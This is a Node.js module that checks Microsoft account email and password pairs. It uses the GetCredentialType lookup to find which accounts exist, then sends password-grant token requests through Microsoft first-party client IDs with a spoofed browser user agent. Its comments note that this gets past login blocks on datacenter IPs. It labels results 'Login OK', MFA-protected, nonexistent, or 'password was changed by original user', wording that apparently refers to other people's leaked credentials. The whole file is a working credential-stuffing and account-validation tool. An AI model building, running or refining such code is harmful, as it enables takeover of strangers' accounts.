/**
 * Microsoft account checker
 *
 * User-facing messages:
 *  - This Email doesn't exist
 *  - Not loginable          (MFA / code / no password path)
 *  - password was changed by original user
 *  - Login OK
 *
 * Uses OAuth token endpoint (works from many hosts where HTML login is blocked).
 * If "other ways" includes password, we still treat it as password attempt.
 */
const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const MSG = {
  NO_EMAIL: "This Email doesn't exist",
  NOT_LOGINABLE: 'Not loginable',
  PASS_CHANGED: 'password was changed by original user',
  OK: 'Login OK'
};

// Public client ids used by Microsoft first-party apps (ROPC / token probes)
const CLIENTS = [
  {
    id: '000000004C12AE6F', // Xbox Live
    scope: 'service::user.auth.xboxlive.com::MBI_SSL',
    token: 'https://login.live.com/oauth20_token.srf'
  },
  {
    id: '1f907974-e22b-4810-a9de-d282292ec59c',
    scope: 'openid offline_access https://graph.microsoft.com/.default',
    token: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token'
  },
  {
    id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Microsoft Office
    scope: 'openid offline_access',
    token: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token'
  }
];

function cleanEmail(e) {
  return String(e || '').trim().toLowerCase();
}

/** Map AADSTS / live error codes → our 3 messages */
function mapTokenError(data, httpStatus) {
  const code = String(data.error_codes?.[0] || data.errorCode || '');
  const err = String(data.error || '');
  const desc = String(data.error_description || data.error_message || data.message || '');
  const blob = (code + ' ' + err + ' ' + desc).toLowerCase();

  // User does not exist
  if (
    /50034|useraccountnotfound|doesn'?t exist|does not exist|unknown.?user|no account|50055|50053/.test(blob) ||
    code === '50034'
  ) {
    return { ok: false, msg: MSG.NO_EMAIL };
  }

  // Wrong password
  if (
    /50126|invalid.?username.?or.?password|password is incorrect|account or password is incorrect|50132|50135|50133/.test(
      blob
    ) ||
    code === '50126'
  ) {
    return { ok: false, msg: MSG.PASS_CHANGED };
  }

  // MFA / code / conditional access / proof — "other ways" without usable password login
  if (
    /50076|50079|50072|50158|50125|50140|53003|53004|mfa|multi.?factor|strong.?auth|one.?time|otp|interrupt|conditional.?access|proofup|device.?code|50097|50199|identity.?protection/.test(
      blob
    )
  ) {
    return { ok: false, msg: MSG.NOT_LOGINABLE };
  }

  // ROPC not allowed / must use different grant — often means password login disabled for app
  // but account may still have password. Try next client.
  if (/700016|7000218|50194|50173|70000|interaction_required|invalid_grant/.test(blob)) {
    // invalid_grant without 50126 often = need interaction (MFA) or bad grant
    if (/interaction_required|mfa|aadsts50076|aadsts50079/.test(blob)) {
      return { ok: false, msg: MSG.NOT_LOGINABLE };
    }
    if (/50126|password/.test(blob)) {
      return { ok: false, msg: MSG.PASS_CHANGED };
    }
    return { ok: false, msg: null, retry: true, raw: desc || err };
  }

  // Locked / disabled
  if (/50057|50005|50058|disabled|locked|blocked/.test(blob)) {
    return { ok: false, msg: MSG.NOT_LOGINABLE };
  }

  if (httpStatus === 200 && (data.access_token || data.refresh_token)) {
    return { ok: true, msg: MSG.OK };
  }

  return { ok: false, msg: null, retry: true, raw: (desc || err || JSON.stringify(data)).slice(0, 300) };
}

async function tokenProbe(email, password, client) {
  const body = new URLSearchParams();
  body.set('grant_type', 'password');
  body.set('client_id', client.id);
  body.set('username', email);
  body.set('password', password);
  body.set('scope', client.scope);
  if (client.token.includes('login.live.com')) {
    body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
  }

  const res = await fetch(client.token, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': UA,
      Accept: 'application/json'
    },
    body: body.toString()
  });

  const data = await res.json().catch(() => ({}));
  if (res.ok && (data.access_token || data.refresh_token)) {
    return { ok: true, msg: MSG.OK, data, client: client.id };
  }
  const mapped = mapTokenError(data, res.status);
  return { ...mapped, data, client: client.id, http: res.status };
}

async function getCredentialType(email) {
  try {
    const res = await fetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': UA,
        Accept: 'application/json'
      },
      body: JSON.stringify({
        username: email,
        isOtherIdpSupported: true,
        checkPhones: false,
        isRemoteNGCSupported: true,
        isCookieBannerShown: false,
        isFidoSupported: true,
        forceotclogin: false,
        otclogindisallowed: false,
        isExternalFederationDisallowed: false,
        isRemoteConnectSupported: false,
        federationFlags: 0,
        isSignup: false,
        flowToken: ''
      })
    });
    return await res.json().catch(() => null);
  } catch (_) {
    return null;
  }
}

/**
 * Interpret GetCredentialType — especially "other ways" + password available
 */
function interpretCredentialType(data) {
  if (!data) return { known: false };
  const code = data.IfExistsResult;
  if (code === 1 || code === 4) {
    return { known: true, exists: false, msg: MSG.NO_EMAIL };
  }
  if (code === undefined || code === null) {
    return { known: false };
  }

  const creds = data.Credentials || {};
  // Federated work/school only
  if (creds.FederationRedirectUrl && !creds.HasPassword) {
    return { known: true, exists: true, msg: MSG.NOT_LOGINABLE, reason: 'federated' };
  }

  // Has password → loginable with password even if PrefCredential is authenticator / "other ways"
  // PrefCredential: 0 password, 1 NGC/authenticator, etc.
  const hasPassword = creds.HasPassword === true || creds.HasPassword === 1;
  const pref = creds.PrefCredential;

  if (hasPassword) {
    // Password is an option under "other ways" → we WILL try password (not Not loginable)
    return {
      known: true,
      exists: true,
      hasPassword: true,
      preferOther: pref !== 0 && pref !== undefined,
      msg: null
    };
  }

  // No password credential at all (only code / authenticator)
  if (hasPassword === false || (creds.RemoteNgcParams && !hasPassword)) {
    // Only if HasPassword explicitly false
    if (creds.HasPassword === false) {
      return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE, reason: 'no_password' };
    }
  }

  return { known: true, exists: true, msg: null };
}

async function tryWorkerCheck(email, password) {
  const base = String(process.env.PASS_WORKER_URL || '').replace(/\/$/, '');
  if (!base) return null;
  try {
    const res = await fetch(base + '/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, type: 'check' })
    });
    return await res.json().catch(() => ({}));
  } catch (e) {
    return { error: e.message };
  }
}

function mapWorker(data) {
  if (!data) return null;
  if (data.status === 'success' || data.ok === true) {
    return { ok: true, summary: MSG.OK, error: null };
  }
  const err = String(data.error || data.message || data.result || '').toLowerCase();
  if (!err && data.status !== 'failed') return null;
  if (/not exist|doesn'?t exist|does not exist|no account|unknown user|50034/.test(err)) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
  }
  if (/code|2fa|mfa|authenticator|other way|proof|identity|not loginable|otp/.test(err)) {
    // If worker says use password / has password path, don't mark not loginable
    if (/password.?option|has.?password|sign in with password/.test(err)) {
      return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
    }
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
  }
  if (/incorrect|wrong|password|50126|changed/.test(err)) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
  }
  if (err) return { ok: false, summary: err.slice(0, 200), error: err.slice(0, 200) };
  return null;
}

async function checkMicrosoft(email, password) {
  email = cleanEmail(email);
  password = String(password || '');
  const details = {};

  if (!email.includes('@')) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  if (!password) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }

  // 1) Optional Selenium worker
  const worker = await tryWorkerCheck(email, password);
  if (worker) {
    details.worker = worker;
    const mapped = mapWorker(worker);
    if (mapped) return { ...mapped, details };
  }

  // 2) GetCredentialType — existence + has password under "other ways"
  const ct = await getCredentialType(email);
  details.credentialType = ct;
  const info = interpretCredentialType(ct);
  details.exists = info;

  if (info.known && info.exists === false) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  // Only skip password try when account has NO password at all
  if (info.msg === MSG.NOT_LOGINABLE && info.hasPassword === false) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
  }
  // If preferOther but hasPassword → still try password (user request)

  // 3) Token probes (works when HTML login is blocked on datacenter IPs)
  const attempts = [];
  for (const client of CLIENTS) {
    try {
      const r = await tokenProbe(email, password, client);
      attempts.push({
        client: client.id,
        ok: r.ok,
        msg: r.msg,
        http: r.http,
        raw: r.data?.error_description || r.data?.error || r.raw
      });
      if (r.ok) {
        details.attempts = attempts;
        return { ok: true, summary: MSG.OK, error: null, details };
      }
      if (r.msg && !r.retry) {
        details.attempts = attempts;
        return { ok: false, summary: r.msg, error: r.msg, details };
      }
    } catch (e) {
      attempts.push({ client: client.id, error: e.message });
    }
  }
  details.attempts = attempts;

  // If any attempt clearly said wrong password
  const wrong = attempts.find((a) => a.msg === MSG.PASS_CHANGED);
  if (wrong) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }
  const noUser = attempts.find((a) => a.msg === MSG.NO_EMAIL);
  if (noUser) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  const mfa = attempts.find((a) => a.msg === MSG.NOT_LOGINABLE);
  if (mfa) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
  }

  // Existence known but all token clients need interaction / blocked
  if (info.known && info.exists && info.hasPassword) {
    // Password exists under other ways but token ROPC blocked → still report as check inconclusive → prefer PASS_CHANGED only if we saw password error
    // User wants: if password path exists, try it — we did; Microsoft blocked ROPC without clear error
    return {
      ok: false,
      summary: MSG.NOT_LOGINABLE,
      error: MSG.NOT_LOGINABLE,
      details
    };
  }

  if (info.known && info.exists === false) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }

  // Last resort: show best raw error in mapped form
  const raw = attempts.map((a) => a.raw).filter(Boolean)[0];
  if (raw) {
    const low = String(raw).toLowerCase();
    if (/password|50126|incorrect/.test(low)) {
      return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
    }
    if (/exist|50034/.test(low)) {
      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
    }
  }

  return {
    ok: false,
    summary: MSG.NOT_LOGINABLE,
    error: MSG.NOT_LOGINABLE,
    details
  };
}

module.exports = { checkMicrosoft, MSG };
